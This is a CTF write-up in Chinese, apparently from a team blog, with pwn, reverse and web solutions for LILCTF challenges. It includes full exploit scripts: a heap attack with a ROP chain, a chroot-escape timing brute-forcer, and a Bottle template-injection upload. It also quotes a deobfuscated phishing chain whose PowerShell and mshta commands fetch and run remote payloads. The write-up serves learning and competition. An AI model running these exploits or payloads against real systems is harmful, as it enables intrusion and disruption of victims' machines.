![](https://seandictionary.top/wp-content/uploads/2025/08/63331f41-e24a-40a4-8738-ab58af153bd1.png)

每次固定 malloc(0x100)

![](https://seandictionary.top/wp-content/uploads/2025/08/3965061b-b602-40f3-8e60-f8a7a7559c2a.png)

存在 uaf

我们可以通过 unsortbins_attack 将 main_arena+88 刷在 chunk_list,此时我们可以写 main_arena+88

main_arena+88 的位置放置了 top_chunk_addr,unsortbins 数量和两个 top_chunk_check 指针

其中指针可以使用位于 data 段的现成地址

![](https://seandictionary.top/wp-content/uploads/2025/08/e0255eed-c88e-4195-ac23-101cf2036093.png)

把 top_chunk_addr 改到 chunk_list 处,此时我们就可以申请 chunk_list

对 chunk_list 修改可以实现任意地址写 0x100 字节

找到了一个 gadget(0x4b8fb8),可以交换 edi 和 esp,实现栈迁移

第一步把 free_hook 改成这个 gadget

我们将 ROP 写在 bss 上,然后 free(bss)

就会跳转到 bss 上执行 ROP

```
from pwn import *
#io=process('./pwn')
io=remote("challenge.xinshi.fun",45428)
elf=ELF('./pwn')
def ch(Id):
    io.sendlineafter(b"Your choice:",str(Id).encode())
def add(Id,payload):
    ch(1)
    io.sendlineafter(b"idx:",str(Id).encode())
    io.sendafter(b"Alright!\nwhat do you want to say\n",payload)
def free(Id):
    ch(2)
    io.sendlineafter(b"idx:",str(Id).encode())
def edit(Id,payload):
    ch(3)
    io.sendlineafter(b"idx:",str(Id).encode())
    io.sendafter(b"context: ",payload)
def bug():
    gdb.attach(io,"set glibc 2.23")
add(0,b'a'*8)
add(1,b'b'*8)
free(0)
target=0x6CCD60
payload=p64(0)+p64(target-0x10)
edit(0,payload)
add(2,b'\x58')
payload=p64(0x6CCD60)+p64(0)+p64(0x6CA858)*2
edit(0,payload)
add(0,p64(0x6CCD60)*3)
edit(2,p64(0x6CCD68)+p64(0x6CCD70)+p64(0)*4)
fhook=0x6CC5E8
magic=0x4b8fb8
flag=0x6ccd78
#rsp->0x6CCE40
edit(0,p64(fhook)+p64(0x6CCE40)+b"./flag\x00\x00")
edit(1,p64(magic))
rdi=0x401a16
rsi=0x401b37
rdx=0x443136
rax=0x41fc84
syscall=0x4678e5
payload =p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(rax)+p64(2)+p64(syscall)
payload+=p64(rdi)+p64(3)+p64(rsi)+p64(0x6CBBA0)+p64(rdx)+p64(0x60)+p64(rax)+p64(0)+p64(syscall)
payload+=p64(rdi)+p64(1)+p64(rax)+p64(1)+p64(syscall)
edit(2,payload)
free(2)

io.interactive()
```

## The Truman Show

压线得分!!!

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+Ch] [rbp-24h]
  int fd; // [rsp+10h] [rbp-20h]
  int v6; // [rsp+14h] [rbp-1Ch]
  void *buf; // [rsp+18h] [rbp-18h]
  char templatea[7]; // [rsp+21h] [rbp-Fh] BYREF
  unsigned __int64 v9; // [rsp+28h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  buf_init(argc, argv, envp);
  puts("buf initial ok");
  securefd();
  puts("fd clear ok");
  puts("RUN and get ouside of the JAIL!!!");
  strcpy(templatea, "XXXXXX");
  if ( !mkdtemp(templatea) )
    __assert_fail("mkdtemp(jail_path) != NULL", "code.c", 0x3Bu, "main");
  puts("mkdir ok");
  if ( chroot(templatea) )
  {
    perror((const char *)&chroot);
    exit(-1);
  }
  puts("chroot ok");
  if ( chdir("/") )
    __assert_fail("chdir(\"/\") == 0", "code.c", 0x44u, "main");
  puts("chdir ok");
  fd = open("/flag", 65);
  write(fd, "FLAG{IT'S FAKE AND HERE IS THE TRUMAN SHOW}", 0x2BuLL);
  close(fd);
  buf = mmap(0LL, 0x1000uLL, 7, 34, 0, 0LL);
  puts("Now it's your show time");
  v6 = read(0, buf, 0x23uLL);
  for ( i = 0; i < v6; ++i )
  {
    if ( *((_BYTE *)buf + i) == 0x80
      || *((_BYTE *)buf + i) == 0x81
      || *((_BYTE *)buf + i) == 0x83
      || *((_BYTE *)buf + i) > 0x37u && *((_BYTE *)buf + i) <= 0x3Bu )
    {
      *((_BYTE *)buf + i) = 0xCC;
    }
  }
  mprotect(buf, 0x1000uLL, 4);
  sandbox();
  ((void (*)(void))buf)();
  return 0;
}
```

题目为 chroot 逃逸,由于使用 chroot 将工作目录就在了一个随机名字的目录中

我们不能直接 open("/flag")

在 securefd 中,留下了"/"根目录作为后门

```
int securefd()
{
  int result; // eax
  int fd; // [rsp+Ch] [rbp-4h]

  close(2);
  open("/", 0);
  result = open("/flag", 0);
  for ( fd = 3; fd <= 1000; ++fd )
    result = close(fd);
  return result;
}
```

且沙箱留下了 openat,我们可以通过 openat 打开位于真机根目录中的"/flag"

由于标准输出函数被禁止了,我们要采用测信道爆破的方式命中 flag

且 shellcode 被禁用了 0x80, 0x81, 0x83

几乎禁止了我们直接对内存进行 xor,add,sub,or 等操作

我们需要将 flag 放入寄存器后再使用 xor 比较才行

将机器码压缩到 0x23 非常极限

```
from pwn import *
#io=process('./pwn')
#io=remote("challenge.xinshi.fun",48136)
def bug():
    gdb.attach(io)
context.arch='amd64'
def pwn(offset,num):
    sc=asm(f"""
        push 2;pop rdi
        mov dword ptr [rsi], 0x67616c66
        xor r10,r10
        pop rdx
        pop rdx
        mov ax,257
        syscall
        mov edi,eax
        xor eax,eax
        pop rdx
        syscall
        mov al, [rsi+{offset}]
        xor al, {num}
        jz $
        """)
    io.send(sc)
flag="LILCTF{"
idx=len(flag)
ch="-{qwertyuiopasdfghjklzxcvbnm1234567890QWERTYUIOPASDFGHJKLZXCVBNM"
while True:
    for x in ch:
        #io=process('./pwn')
        io=remote("challenge.xinshi.fun",40452)
        io.recvuntil(b"Now it's your show time\n")
        print(' flag ---> '+flag+x)
        start = time.time()
        pwn(idx,ord(x))
        io.can_recv(timeout=4)
        end = time.time()
        io.close()
        print(end-start)
        if end - start > 4:
            flag += x
            break
    if flag.endswith("}"):
        break
    idx += 1
print(flag)
io.interactive()

#LILCTF{5bf21256-dd2c-4e2b-970e-1576757dafb2}
```

注意每次爆破都会创建一个目录,越爆破到后面创建目录消耗的时间会导致命中的时间测信道被混淆

所以每命中 5,6 个字符就要重启靶机

补:在 shellcode 过滤的过程中会,for 循环过滤了"8"和"9"两个字符,导致这两个字符无法用于匹配.所以将唯一一个无法匹配的字符用 8/9 替换就可以了

# Reverse

## **1'M no7 A rO6oT**

网页诱导用户执行以下命令，对 mp3 执行\*i*\\\\\\\\\\\\\\\*2\msh*e 匹配到的程序。

```
powershell . \*i*\\\\\\\\\\\\\\\*2\msh*e http://challenge.xinshi.fun:41909/Coloringoutomic_Host.mp3   http://challenge.xinshi.fun:41909/Coloringoutomic_Host.mp3 #     ✅ Ι am nοt a rοbοt: CAPTCHA Verification ID: 10086
```

用这代码找到匹配的程序是 mshta.exe，执行 HTA 用的，hta 语法同 html

```
Get-ChildItem \*i*\\\\\\\\\\\\\\\*2\msh*e
```

下载 mp3，用记事本打开，搜索"<\"来查找相关代码，此处省略数据. 接下来在浏览器控制台，输出将要执行的代码，连续反混淆 js

```
<HTA:APPLI xmlns:dummy="http://e.org" CATION showInTaskbar="no" windowState="minimize">
<script>
    window.resizeTo(0, 0);
    window.moveTo(-9999, -9999);
    SK = 102; UP = 117; tV = 110; ...
    var SxhM = String.fromCharCode(...)
    eval(SxhM);
    window.close();
</script>
```

SxhM

```
function ioRjQN(FVKq) {
    var ohyLbg = "";
    for (var emGK = 0; emGK < FVKq.length; emGK++){
        var ndZC = String.fromCharCode(FVKq[emGK] - 601);
        ohyLbg = ohyLbg + ndZC
    }
    return ohyLbg
};
var ohyLbg = ioRjQN([...])
var emGK = ioRjQN([688, 684, 700, 715, 706, 713, 717, 647, 684, 705, 702, 709, 709]);
var ioRjQN = new ActiveXObject(emGK);
ioRjQN.Run(ohyLbg, 0, true);
```

emGK 是 WScript.Shell，ohyLbg:

```
powershell.exe -w 1 -ep Unrestricted -nop $EFTE =([regex]::Matches('a5a9b49fb8adbeb8e19cbea3afa9bfbfeceee8a9a2baf69fb5bfb8a9a19ea3a3b8909fb5bf9b839bfaf8909ba5a2a8a3bbbf9ca3bba9be9fa4a9a0a090bafde2fc90bca3bba9bebfa4a9a0a0e2a9b4a9eeece19ba5a2a8a3bb9fb8b5a0a9ec84a5a8a8a9a2ece18dbeabb9a1a9a2b880a5bfb8ecebe1bbebe0eba4ebe0ebe1a9bcebe0eb99a2bea9bfb8bea5afb8a9a8ebe0ebe18fa3a1a1ada2a8ebe0ee9fa9b8e19aadbea5adaea0a9ecffeceba4b8b8bcf6e3e3afa4ada0a0a9a2aba9e2b4a5a2bfa4a5e2aab9a2f6f8fdf5fcf5e3aea9bfb8b9a8a8a5a2abe2a6bcabebf79f85ec9aadbea5adaea0a9f6e396f888eceb82a9b8e29ba9ae8fa0a5a9a2b8ebf7afa8f79f9aecaff884ece4e2ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8e2e4e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9bee597fe91e282ada1a9e5e285a2baa3a7a9e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8e2e4e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9beb09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6a882ada1a9ebb1e5e282ada1a9e5e285a2baa3a7a9e4eb82a9e6afb8ebe0fde0fde5e5e4809fec9aadbea5adaea0a9f6e396f888e5e29aada0b9a9e5f79f9aec8dece4e4e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b9a983e5b08ba9b8e181a9a1aea9bee5b09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6bba2e6a8e6abebb1e5e282ada1a9e5f7eae4979fafbea5bcb88ea0a3afa791f6f68fbea9adb8a9e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b9a983e5e2e4e48ba9b8e19aadbea5adaea0a9ec8de5e29aada0b9a9e5e285a2baa3a7a9e4e49aadbea5adaea0a9ecffece19aada0e5e5e5e5eef7','.{2}') | % { [char]([Convert]::ToByte($_.Value,16) -bxor '204') }) -join '';& $EFTE.Substring(0,3) $EFTE.Substring(3)
```

```
iex Start-Process "$env:SystemRoot\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -ArgumentList '-w','h','-ep','Unrestricted','-Command',"Set-Variable 3 'http://challenge.xinshi.fun:41909/bestudding.jpg';SI Variable:/Z4D 'Net.WebClient';cd;SV c4H (.`$ExecutionContext.InvokeCommand.((`$ExecutionContext.InvokeCommand|Get-Member)[2].Name).Invoke(`$ExecutionContext.InvokeCommand.((`$ExecutionContext.InvokeCommand|Get-Member|Where{(GV _).Value.Name-clike'*dName'}).Name).Invoke('Ne*ct',1,1))(LS Variable:/Z4D).Value);SV A ((((Get-Variable c4H -ValueO)|Get-Member)|Where{(GV _).Value.Name-clike'*wn*d*g'}).Name);&([ScriptBlock]::Create((Get-Variable c4H -ValueO).((Get-Variable A).Value).Invoke((Variable 3 -Val))))";
```

这里代码的意思应该是，连接网络下载了 bestudding.jpg，这个不是图片而是指令，继续 echo

```
$DebugPreference = $ErrorActionPreference = $VerbosePreference = $WarningPreference = "SilentlyContinue"

[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")

shutdown /s /t 600 >$Null 2>&1

$Form = New-Object System.Windows.Forms.Form
$Form.Text = "Ciallo～(∠·ω< )⌒★"
$Form.StartPosition = "Manual"
$Form.Location = New-Object System.Drawing.Point(40, 40)
$Form.Size = New-Object System.Drawing.Size(720, 480)
$Form.MinimalSize = New-Object System.Drawing.Size(720, 480)
$Form.MaximalSize = New-Object System.Drawing.Size(720, 480)
$Form.FormBorderStyle = "FixedDialog"
$Form.BackColor = "#0077CC"
$Form.MaximizeBox = $False
$Form.TopMost = $True


$fF1IA49G = "LILCTF{6e_v19ilan7_aG@ln$T_PHl$hIn9}"
$fF1IA49G = "N0pe"


$Label1 = New-Object System.Windows.Forms.Label
$Label1.Text = ":)"
$Label1.Location = New-Object System.Drawing.Point(64, 80)
$Label1.AutoSize = $True
$Label1.ForeColor = "White"
$Label1.Font = New-Object System.Drawing.Font("Consolas", 64)

$Label2 = New-Object System.Windows.Forms.Label
$Label2.Text = "这里没有 flag；这个窗口是怎么出现的呢，flag 就在那里"
$Label2.Location = New-Object System.Drawing.Point(64, 240)
$Label2.AutoSize = $True
$Label2.ForeColor = "White"
$Label2.Font = New-Object System.Drawing.Font("微软雅黑", 16)

$Label3 = New-Object System.Windows.Forms.Label
$Label3.Text = "你的电脑将在 10 分钟后关机，请保存你的工作"
$Label3.Location = New-Object System.Drawing.Point(64, 300)
$Label3.AutoSize = $True
$Label3.ForeColor = "White"
$Label3.Font = New-Object System.Drawing.Font("微软雅黑", 16)

$Form.Controls.AddRange(@($Label1, $Label2, $Label3))

$Form.Add_Shown({$Form.Activate()})
$Form.Add_FormClosing({
    $_.Cancel = $True
    [System.Windows.Forms.MessageBox]::Show("不允许关闭！", "提示", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
})

$Form.ShowDialog() | Out-Null
```

## ARM ASM

jadx 反编译，发现主要逻辑在本地的 so 方法里面的 check 函数中

![](https://seandictionary.top/wp-content/uploads/2025/08/e41a08f5-0e33-41ef-97de-73d42943e41b.png)

看一下 so 文件，然后看 export 导出跟踪到 check 函数：

![](https://seandictionary.top/wp-content/uploads/2025/08/4110e4fb-dc3f-4bf4-8ecb-01038f4e3e84.png)

对传入的字符串先用 t 向量乱序再异或，然后再进行移位操作，最后换表 base64

最复杂的是第一步操作，它把原始字符串分成三块，每块长度为 16 字节，然后这三块进行相同的加密操作，但 t 向量每次也会更新，所以这三块最终的加密流程不太一样，解密的时候要用对应的 t 向量

t 向量的更改方式就是异或一下 n2 序列，即 0、1、2 组成的长度为 16 的数组

从 jadx 里面提取一下密文，用在线网站 base64 解码，然后逆向移位，最后解决最复杂的乱序异或过程

base64 解码过程：

![](https://seandictionary.top/wp-content/uploads/2025/08/0a4136d6-6b69-4ced-a1b4-cc2aee2e475d.png)

逆向移位过程：

```
enc=[0x92,0xb7,0x7c,0x0b,0xbc,0x6b,0xb2,0x39,0x7d,0x13,0xa1,0x50,0x72,0x20,0x48,0x62,0x34,0x61,0xc3,0xb0,0x54,0xeb,0x33,0x6d,0xca,0x35,0x72,0x5b,0xb7,0x66,0xf2,0xb6,0x69,0x93,0xbc,0x62,0xaa,0x33,0x67,0xf3,0x31,0x6b,0x9b,0x2d,0x6c,0x3b,0xaf,0x6c]
encOut = [0]*48
for i in range(0,len(enc),3):
    encOut[i] = ((enc[i] >> 3) & 0xff) | ((enc[i] << 5) & 0xff)
    encOut[i+1] = ((enc[i+1] << 1) & 0xff) | ((enc[i+1] >> 7) & 0xff)
    encOut[i+2] = enc[i+2]
print(encOut)
```

乱序+异或过程：

```
enc = [82, 111, 124, 97, 121, 107, 86, 114, 125, 98, 67, 80, 78, 64, 72, 76, 104, 97, 120, 97, 84, 125, 102, 109, 89,
       106, 114, 107, 111, 102, 94, 109, 105, 114, 121, 98, 85, 102, 103, 126, 98, 107, 115, 90, 108, 103, 95, 108]

t0 = [0x0D, 0x0E, 0x0F, 0x0C, 0x0B, 0x0A, 0x09, 0x08,
      0x06, 0x07, 0x05, 0x04, 0x02, 0x03, 0x01, 0x00]

t_list = []
# 先准备好t向量列表
for n2 in range(3):
    t_list.append(t0)
    t0 = [b ^ n2 for b in t0]
print(t_list)

flag = [0] * 48
# 用对应的t向量解密对应的密文块
for n2 in range(3):
    t = t_list[n2]
    block_enc = enc[n2 * 16:(n2 + 1) * 16]

    # 先 XOR t
    after_xor = [block_enc[i] ^ t[i] for i in range(16)]

    # 再逆乱序
    orig_block = [0] * 16
    for i in range(16):
        orig_block[t[i]] = after_xor[i]

    flag[n2 * 16:(n2 + 1) * 16] = orig_block

print("".join(chr(x) for x in flag))
```

## **obfusheader.h**

程序被严重控制流混淆，控制流没法看，但是 flag 的存储位置很好找，跟踪一下数据流

动态调试，随便输一下 flag，慢慢试可以试出来 flag 长度为 40

然后记住一下 flag 的存储地址，慢慢看汇编动调，调一会就回去看一下 flag 有没有被改变，调半天之后可以跟踪到这几个地方：

![](https://seandictionary.top/wp-content/uploads/2025/08/6c5f4f11-dfe3-4721-91f6-7c51d43da5ea.png)

![](https://seandictionary.top/wp-content/uploads/2025/08/82e158cc-9008-4f3f-bbd1-b697c2dcd22f.png)

![](https://seandictionary.top/wp-content/uploads/2025/08/eb994c8a-42ce-4d8a-92ed-d0a4b426c2b3.png)

还有个按位取反（忘记截图了）

也就是说程序的加密流程为： 以 word 数组形式异或一个 rand 序列（种子未知）->byte 数组每个元素高低位交换->按位取反

rand 序列可以用我们输入的 flag 和其加密后的结果异或得出，为：

```
xorRand = [19574,32184,18276,20728,17319,13256,26503,27092,19582,24897,16484,4005,19731,32681,8697,23744,6006,30110,509,13132]
```

然后要找到密文，上面图里那个并不是最终的密文，可以直接动调到这里

![](https://seandictionary.top/wp-content/uploads/2025/08/ad252912-ea51-4bc9-a4e6-a2fece955a06.png)

即比对结束后的区域，再跟进前面得到的密文的地址查看就行

![](https://seandictionary.top/wp-content/uploads/2025/08/1c2831c4-e65e-4e98-9882-fca3d5c8c6bf.png)

然后逆向解密即可

```
xorRand = [19574,32184,18276,20728,17319,13256,26503,27092,19582,24897,16484,4005,19731,32681,8697,23744,6006,30110,509,13132]
# 第一轮异或这个列表
# 第二轮高低位交换
# 第三轮按位取反
enc=[0x5C,0xAF,0xB0,0x1C,0xFC,0xEF,0xC7,0x8D,0x3,0xDF,0x34,0x39,0x13,0xCB,0x47,0x2D,0x5B,0x7E,0xEF,0xFA,0x2D,0xC9,0xD2,0xFA,0xFA,0x2F,0x83,0xFD,0xA6,0xA8,0x6,0x1C,0xCE,0x7B,0x42,0xBC,0x53,0xB9,0xDD,0x1B]
enc2=[]
enc3=[]
enc4=[]
for i in enc:
    enc2.append(~i & 0xff)
print(enc2)
for i in enc2:
    highBit = i & 0xf0
    lowBit = i & 0x0f
    k = (highBit >> 4) | (lowBit << 4)
    enc3.append(k)
for i in range(0,len(enc3),2):
    highWord = enc3[i+1]
    lowWord = enc3[i]
    k = (highWord << 8) | lowWord
    enc4.append(k)
for i in range(20):
    print(enc4[i]^xorRand[i],end=',')
```

这个解出来是一个 word 数组，要根据小端序把它恢复成字符串

```
data = [
    18764, 17228, 18004, 30587, 16744, 24436, 9289, 17503, 21556, 12608,
    9033, 24439, 16451, 24430, 21612, 25183, 24421, 16709, 25911, 32110,
]

flag = ""
for num in data:
    flag += (chr(num & 0xFF) + chr((num >> 8) & 0xFF))
print(flag)
```

## Qt_Creator

发现程序有反调试，而且输错了就直接退出，直接查 IsDebugger 的引用，改 ZF 过调试。

查 exit 的引用直接找到函数，v21 记录是否成功，竟然是直接比较字符串，动态调试 v22 出 flag

![](https://seandictionary.top/wp-content/uploads/2025/08/89db3d3f-ab08-4b8c-86bb-7c4ed4624cf1.png)

```
LILCTF{Q7_cre4t0r_1s_very_c0nv3ni3nt}
```

## **Oh_My_Uboot**

查找字符串确定主板信息

```
strings 224416_re-u-boot.elf | grep -iE "board"

board=vexpress
board_name=vexpress
```

使用 QEMU 模拟，另一边开个终端启用 gdb

```
qemu-system-arm -machine vexpress-a9 -cpu cortex-a9 -m 512M -kernel u-boot.elf -nographic -s -S
```

```
target remote localhost:1234
```

这是调试的界面

```
U-Boot 2025.04 (Jul 01 2025 - 13:56:28 +0800)

DRAM:  512 MiB
WARNING: Caches not enabled
Core:  23 devices, 11 uclasses, devicetree: embed
Flash: 128 MiB
MMC:   mmci@5000: 0
Loading Environment from Flash... *** Warning - bad CRC, using default environment

In:    uart@9000
Out:   uart@9000
Err:   uart@9000
Net:   eth0: ethernet@3,02000000
Autoboot in 2 seconds
Hash sha256 not supported!
MMC Device 1 not found
no mmc device at slot 1
Card did not respond to voltage select! : -110
smc911x: detected LAN9118 controller
smc911x: phy initialized
smc911x: MAC 52:54:00:12:34:56
BOOTP broadcast 1
DHCP client bound to address 10.0.2.15 (2 ms)
*** Warning: no boot file name; using '0A00020F.img'
Using ethernet@3,02000000 device
TFTP from server 10.0.2.2; our IP address is 10.0.2.15
Filename '0A00020F.img'.
Load address: 0x60100000
Loading: *
TFTP error: 'Access violation' (2)
Not retrying...
smc911x: MAC 52:54:00:12:34:56
missing environment variable: pxefile_addr_r
smc911x: detected LAN9118 controller
smc911x: phy initialized
smc911x: MAC 52:54:00:12:34:56
BOOTP broadcast 1
DHCP client bound to address 10.0.2.15 (0 ms)
Using ethernet@3,02000000 device
TFTP from server 10.0.2.2; our IP address is 10.0.2.15
Filename 'boot.scr.uimg'.
Load address: 0x60100000
Loading: *
TFTP error: 'Access violation' (2)
Not retrying...
smc911x: MAC 52:54:00:12:34:56
smc911x: detected LAN9118 controller
smc911x: phy initialized
smc911x: MAC 52:54:00:12:34:56
BOOTP broadcast 1
DHCP client bound to address 10.0.2.15 (0 ms)
Using ethernet@3,02000000 device
TFTP from server 10.0.2.2; our IP address is 10.0.2.15
Filename 'boot.scr.uimg'.
Load address: 0x60100000
Loading: *
TFTP error: 'Access violation' (2)
Not retrying...
smc911x: MAC 52:54:00:12:34:56
cp - memory copy

Usage:
cp [.b, .w, .l] source target count
Wrong Image Type for bootm command
ERROR -91: can't get kernel image!
### Please input uboot password: ###
```

一直下断点、动态调试，前前后后下了五十。

因为程序把函数又加载一遍再运行的，所以进入 7FF 地址时 dump 出 0x7FF50000~0x80000000 的内存，用 IDA 协助分析。

也是成功找到交互的函数了，这个程序用空间也是真的省，提示信息的字符串和暂存 flag 的空间居然是同一块，最后两个函数一个是加密，一个是比较。

```
void sub_7FF71F74()
{
  int *v0; // r6
  int v1; // r3
  _BYTE *v2; // r2
  int v3; // r0
  int v4; // r4
  char v5; // r5
  _BYTE v6[4]; // [sp+0h] [bp-88h] BYREF
  _BYTE v7[52]; // [sp+4h] [bp-84h] BYREF
  _BYTE v8[38]; // [sp+38h] [bp-50h] BYREF
  char v9; // [sp+5Eh] [bp-2Ah] BYREF

  v0 = off_7FF72078;
  while ( *v0 )
  {
    sub_7FF5FCFC(v8, dword_7FF7207C, 38);
    sub_7FF5FC20(&v9, 0, 26);
    v1 = 0;
    v2 = v8;
    do
    {
      ++v1;
      *v2++ ^= 0x72u;
    }
    while ( v1 != 37 );
    v3 = sub_7FF7686C(v8);
    v4 = 0;
    while ( 1 )
    {
      v3 = sub_7FF76848(v3);
      v5 = v3;
      if ( (unsigned __int8)v3 == 13 )
        break;
      if ( (unsigned __int8)v3 == 8 )
      {
        if ( v4 > 0 )
        {
          sub_7FF768E4((unsigned __int8)v3);
          sub_7FF768E4(32);
          v3 = sub_7FF768E4(8);
          --v4;
        }
      }
      else
      {
        v3 = sub_7FF768E4(42);
        v6[v4 + 56] = v5;
        ++v4;
      }
    }
    v6[v4 + 56] = 0;
    sub_7FF768E4(10);
    sub_7FF71E3C(v8, v7);
    if ( !sub_7FFC2138(v7, dword_7FF72080) )
      *v0 = 0;
  }
}
```

Flag -> Xor 0x72 -> 魔改 base58(自定义编码表 chr(48)~chr(105))

-> "5W2b9PbLE6SIc3WP=X6VbPI0?X@HMEWH;"

```
_BYTE *__fastcall sub_7FF71E3C(_BYTE *a1, _BYTE *a2)
{
  int v4; // r0
  _BYTE *v5; // r3
  int v6; // r2
  _BYTE *v7; // r0
  int v8; // r3
  char *v9; // r1
  _BYTE *v10; // r4
  int v11; // r7
  _BYTE *v12; // r8
  unsigned __int8 *v13; // r10
  unsigned int v14; // r7
  _BYTE *v15; // r2
  unsigned int v16; // r3
  _BYTE *v17; // r4
  _BYTE *result; // r0
  unsigned __int8 *v19; // r11
  int v20; // r6
  unsigned __int8 v21; // r1
  char v22; // r1
  _BYTE v23[4]; // [sp+0h] [bp-90h] BYREF
  int v24; // [sp+4h] [bp-8Ch]
  char v25; // [sp+Ch] [bp-84h] BYREF

  v4 = sub_7FFC21E0();
  v5 = a1;
  v6 = v4;
  v7 = &a1[v4];
  while ( v5 != v7 )
    *v5++ ^= 0x72u;
  LOBYTE(v8) = 48;
  v9 = &v25;
  do
  {
    *v9++ = v8;
    v8 = (unsigned __int8)(v8 + 1);
  }
  while ( v8 != 106 );
  v10 = &a2[3 * (v6 / 2) + 3];
  v11 = v6 - 1;
  v12 = v10;
  sub_7FF5FCFC(v10, a1, v6);
  v13 = v10;
  v14 = (unsigned int)&v10[v11];
  while ( (unsigned int)v13 <= v14 )
  {
    if ( *v13 )
    {
      v19 = v13;
      v20 = 0;
      while ( (unsigned int)v19 <= v14 )
      {
        v24 = ((__int16)v20 << 8) + *v19;
        sub_7FFC8600(v24, 58);
        v20 = v21;
        *v19++ = sub_7FFC8534(v24, 58);
      }
      *--v12 = v23[v20 + 12];
    }
    else
    {
      ++v13;
    }
  }
  v15 = a2;
  v16 = 0;
  v17 = (_BYTE *)(v10 - v12);
  while ( (unsigned int)v17 > v16 )
  {
    v22 = v12[v16++];
    *v15++ = v22;
  }
  result = a2;
  *v15 = 0;
  return result;
}
```

![](https://seandictionary.top/wp-content/uploads/2025/08/image-1024x453.png)

# Web

## ez_bottle

由题目这部分可知，需要我们上传 zip 文件，然后会检测文件内容，合格之后再进行解压

```
@post('/upload')
def upload():
    zip_file = request.files.get('file')
    if not zip_file or not zip_file.filename.endswith('.zip'):
        return 'Invalid file. Please upload a ZIP file.'

    if len(zip_file.file.read()) > MAX_FILE_SIZE:
        return 'File size exceeds 1MB. Please upload a smaller ZIP file.'

 ....
```

通过查看 bottle 框架的开发文档，可以知道 bottle 允许%后跟上命令，那就可以将命令写在 tlp 文件中再进行解压后上传，题目过滤的\_用 chr(95)来代替，将执行路径直接设置为根目录，这样就可以直接包含 flag 文件

网站本身没有上传功能，也不让导入 numpy，就直接用 bottle 自带的 include，直接 ai 写个上传代码即可

```
import requests
import time
import re
import zipfile
from io import BytesIO

# 配置目标信息
TARGET_URL = "http://challenge.xinshi.fun:44810"  # 替换为目标URL
UPLOAD_ENDPOINT =f"{TARGET_URL}/upload"
VIEW_BASE =f"{TARGET_URL}/view"

# 创建恶意模板文件内容
exploit_content = """
% import bottle
% setattr(bottle, 'TEMPLATE' + chr(95) + 'PATH', ['/'])
% include('flag')
"""

# 创建内存中的ZIP文件defcreate_malicious_zip():
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w') as zf:
        # 使用随机文件名增加成功率
        filename =f"exploit_{int(time.time())}.tpl"
        zf.writestr(filename, exploit_content)
    zip_buffer.seek(0)
    return zip_buffer, filename

# 上传ZIP文件并解析响应defupload_and_exploit():
    # 创建恶意ZIP
    zip_buffer, filename = create_malicious_zip()

    # 上传文件
    files = {'file': ('exploit.zip', zip_buffer, 'application/zip')}
    response = requests.post(UPLOAD_ENDPOINT, files=files)

    if response.status_code != 200:
        print(f"上传失败! 状态码: {response.status_code}")
        print(f"响应内容: {response.text[:500]}...")
        return# 解析响应获取MD5和文件名
    match = re.search(r'/view/([a-f0-9]+)/([^\s"]+)', response.text)
    ifnot match:
        print("解析上传响应失败!")
        print("尝试查找返回内容:", response.text[:500])
        return

    md5_hash = match.group(1)
    # 使用我们实际生成的文件名（响应中可能截断）# filename = match.group(2) # 访问漏洞URL
    exploit_url =f"{VIEW_BASE}/{md5_hash}/{filename}"
    print(f"访问漏洞URL: {exploit_url}")

    flag_response = requests.get(exploit_url)

    if flag_response.status_code == 200:
        print("\n成功获取响应:")
        print(flag_response.text)

        # 检查是否是flag格式if "flag{" in flag_response.text:
            print("\n🎉 成功获取flag!")
        else:
            print("响应中包含flag? 检查输出内容")
    else:
        print(f"获取flag失败! 状态码: {flag_response.status_code}")
        print(f"错误响应: {flag_response.text[:500]}...")

if __name__ == "__main__":
    print("开始漏洞利用...")
    print("1. 创建恶意ZIP文件")
    print("2. 上传到目标服务器")
    print("3. 触发模板注入漏洞")
    print("=" * 50)

    upload_and_exploit()



 #LILCTF{6O7T1E_haS_83en_reCYCLEd}
```
